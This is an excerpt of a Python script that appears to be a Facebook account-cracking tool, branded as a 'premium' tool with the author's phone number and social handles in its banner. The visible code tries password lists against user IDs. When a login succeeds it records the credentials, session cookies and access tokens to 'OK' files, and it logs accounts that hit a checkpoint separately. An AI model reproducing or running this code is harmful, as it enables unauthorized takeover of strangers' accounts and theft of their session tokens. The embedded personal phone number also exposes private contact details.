...
def logo():
	...
	print("""\33[93m╔══════════════════════════════════════════╗
\33[93m║\33[95mWELCOME TO JEWEL-TECH TOOL \x1b[0;32m[PREMIUM] \33[93m      ║
\33[93m║       #TOOL AUTHOR \x1b[0;32m[JEWEL] \x1b[0;36mALIU JEWEL\33[93m    ║
\33[93m╚══════════════════════════════════════════╝
\x1b[0;32m -------------------------------------------
\x1b[0;34m╔══════════════════════════════════════════╗
\x1b[0;34m║#BEST FRIEND  :\x1b[0;31mAHM JEWEL/FUNDS JEWMAN \x1b[0;34m       ║
\x1b[0;34m║#FACEBOOK NAME:\x1b[0;31m[JEWEL FUNDS]       \x1b[0;34m       ║
\x1b[0;34m║#GITHUB       :\x1b[0;31mJEWEL-FUNDS        \x1b[0;34m      ║
\x1b[0;34m║#WHATSAPP     :\x1b[0;31m +2349055012862     \x1b[0;34m       ║
\x1b[0;34m╚══════════════════════════════════════════╝""")
os.system('xdg-open https://api.whatsapp.com/send?phone=+2349055012862W&text=Hello')
def login():
	os.system("clear")
	try:
		#-> connection test
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\x1b[0;34m[JEWEL-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\x1b[0;32m[JEWEL-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\x1b[0;34m[JEWEL-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\x1b[0;32m[JEWEL-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\x1b[0;34m[JEWEL-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\x1b[0;32m[JEWEL-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\x1b[0;34m[JEWEL-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
